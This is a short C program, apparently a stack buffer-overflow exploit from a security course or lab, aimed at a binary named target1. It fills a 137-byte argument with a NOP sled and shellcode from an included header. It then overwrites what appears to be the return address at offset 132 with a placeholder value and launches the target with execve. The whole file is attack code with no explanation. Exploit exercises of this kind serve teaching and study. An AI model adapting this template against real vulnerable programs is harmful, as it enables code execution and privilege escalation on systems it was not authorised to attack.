#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "shellcode.h"

#define TARGET "/home/user-root/target1"

int main() {
    char* args[3];
    char* env[1];

    args[0] = TARGET;
    args[1] = "hi there";
    args[2] = NULL;

    env[0] = NULL;

    args[1] = malloc(137);

    memset(args[1], 0x90, 136);

    args[1][136] = '\0';
    memcpy(args[1], shellcode, strlen(shellcode));

    *(unsigned int *)(args[1] + 132) = 0x12345678;

    if (0 > execve(TARGET, args, env)) {
        fprintf(stderr, "execve failed.\n");
    }

    return 0;
}